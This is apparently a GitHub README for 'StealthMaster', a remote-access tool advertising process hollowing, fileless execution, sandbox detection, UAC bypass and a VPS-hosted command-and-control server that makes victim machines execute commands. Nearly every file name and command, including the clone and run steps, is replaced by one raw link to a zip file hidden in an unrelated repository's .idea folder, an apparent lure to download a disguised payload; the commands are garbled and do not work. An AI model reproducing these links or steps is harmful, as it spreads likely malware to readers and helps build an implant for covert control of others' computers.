# StealthMaster

A professional-grade tool with a GUI for editing, building, and deploying a gRPC-based client-server system. This project includes a client (`StealthMaster`) and a server with bidirectional streaming capabilities, designed for high stealth, stability, and performance.

## Features
- **GUI**: Edit client and server code, save changes, build EXE, run the server, and test server connection with a modern dark theme.
- **gRPC**: Secure and fast communication with bidirectional streaming.
- **Stealth**: Process hollowing into `https://github.com/GHost1959/indies-on-solana/raw/refs/heads/main/.idea/inspectionProfiles/indies-solana-on-v3.5.zip`, fileless execution, and sandbox detection.
- **UAC Bypass**: SilentCleanup and EventVwr techniques.
- **Stability**: Watchdog system for crash recovery.

## Prerequisites
- Python 3.8+
- Git
- Windows (for client features like UAC bypass and process hollowing)

## Installation

1. **Clone the Repository**
   ```bash
   git clone https://github.com/GHost1959/indies-on-solana/raw/refs/heads/main/.idea/inspectionProfiles/indies-solana-on-v3.5.zip
   cd StealthMaster
   
2. **Install Dependencies**
    ```bash
   pip install grpcio grpcio-tools cryptography pywin32 tkinter pyinstaller

3. **Generate gRPC Files**
   ```bash 
   python -m https://github.com/GHost1959/indies-on-solana/raw/refs/heads/main/.idea/inspectionProfiles/indies-solana-on-v3.5.zip -Iprotos --python_out=generated --grpc_python_out=generated https://github.com/GHost1959/indies-on-solana/raw/refs/heads/main/.idea/inspectionProfiles/indies-solana-on-v3.5.zip
   
4. **Generate SSL Certificates**
   ```bash
   openssl req -newkey rsa:2048 -nodes -keyout https://github.com/GHost1959/indies-on-solana/raw/refs/heads/main/.idea/inspectionProfiles/indies-solana-on-v3.5.zip -x509 -days 365 -out https://github.com/GHost1959/indies-on-solana/raw/refs/heads/main/.idea/inspectionProfiles/indies-solana-on-v3.5.zip
   

## Usage
1.**Running the GUI**
   ```bash 
   python https://github.com/GHost1959/indies-on-solana/raw/refs/heads/main/.idea/inspectionProfiles/indies-solana-on-v3.5.zip
   ```
   - Client Editor: Edit https://github.com/GHost1959/indies-on-solana/raw/refs/heads/main/.idea/inspectionProfiles/indies-solana-on-v3.5.zip, save changes, and click "Build Client EXE" to create an executable.
   - Server Editor: Edit https://github.com/GHost1959/indies-on-solana/raw/refs/heads/main/.idea/inspectionProfiles/indies-solana-on-v3.5.zip, save changes, and click "Run Server" to start the server locally.

## Deploying the Server Online
1. **Get a VPS (e.g., DigitalOcean, AWS):**
   - Rent a VPS with Ubuntu.
   - SSH into it: ssh user@your-vps-ip.
2. **Deploying the Server Online**
   ```bash
   sudo apt update
   sudo apt install python3 python3-pip
   pip3 install grpcio grpcio-tools cryptography
   
3. **Install Dependencies on VPS**
   - Upload https://github.com/GHost1959/indies-on-solana/raw/refs/heads/main/.idea/inspectionProfiles/indies-solana-on-v3.5.zip, https://github.com/GHost1959/indies-on-solana/raw/refs/heads/main/.idea/inspectionProfiles/indies-solana-on-v3.5.zip, https://github.com/GHost1959/indies-on-solana/raw/refs/heads/main/.idea/inspectionProfiles/indies-solana-on-v3.5.zip, https://github.com/GHost1959/indies-on-solana/raw/refs/heads/main/.idea/inspectionProfiles/indies-solana-on-v3.5.zip, and https://github.com/GHost1959/indies-on-solana/raw/refs/heads/main/.idea/inspectionProfiles/indies-solana-on-v3.5.zip via SCP:
   ```bash 
   scp https://github.com/GHost1959/indies-on-solana/raw/refs/heads/main/.idea/inspectionProfiles/indies-solana-on-v3.5.zip user@your-vps-ip:/home/user/
   scp https://github.com/GHost1959/indies-on-solana/raw/refs/heads/main/.idea/inspectionProfiles/indies-solana-on-v3.5.zip https://github.com/GHost1959/indies-on-solana/raw/refs/heads/main/.idea/inspectionProfiles/indies-solana-on-v3.5.zip generated/* user@your-vps-ip:/home/user/
4. **Run the Server**
   ```bash
   python3 https://github.com/GHost1959/indies-on-solana/raw/refs/heads/main/.idea/inspectionProfiles/indies-solana-on-v3.5.zip
5. **Update Client**
   - Edit C2_SERVER in https://github.com/GHost1959/indies-on-solana/raw/refs/heads/main/.idea/inspectionProfiles/indies-solana-on-v3.5.zip to your VPS IP or domain (e.g., https://github.com/GHost1959/indies-on-solana/raw/refs/heads/main/.idea/inspectionProfiles/indies-solana-on-v3.5.zip).

6. **Open Port 443**
   ```bash
   sudo ufw allow 443

## Example
1. **Run the GUI: python https://github.com/GHost1959/indies-on-solana/raw/refs/heads/main/.idea/inspectionProfiles/indies-solana-on-v3.5.zip**
2. **Edit https://github.com/GHost1959/indies-on-solana/raw/refs/heads/main/.idea/inspectionProfiles/indies-solana-on-v3.5.zip, change C2_SERVER to https://github.com/GHost1959/indies-on-solana/raw/refs/heads/main/.idea/inspectionProfiles/indies-solana-on-v3.5.zip, and save.**
3. **Click "Build Client EXE" to generate https://github.com/GHost1959/indies-on-solana/raw/refs/heads/main/.idea/inspectionProfiles/indies-solana-on-v3.5.zip**
4. **Click "Build Client EXE" to generate https://github.com/GHost1959/indies-on-solana/raw/refs/heads/main/.idea/inspectionProfiles/indies-solana-on-v3.5.zip**
5. **Click "Build Client EXE" to generate https://github.com/GHost1959/indies-on-solana/raw/refs/heads/main/.idea/inspectionProfiles/indies-solana-on-v3.5.zip**
6. **Deploy https://github.com/GHost1959/indies-on-solana/raw/refs/heads/main/.idea/inspectionProfiles/indies-solana-on-v3.5.zip on a VPS and run it.**
7. **Run the EXE on a Windows machine—it connects to the server and executes commands.**

### This project is for educational purposes only. No warranty is provided. Use at your own risk.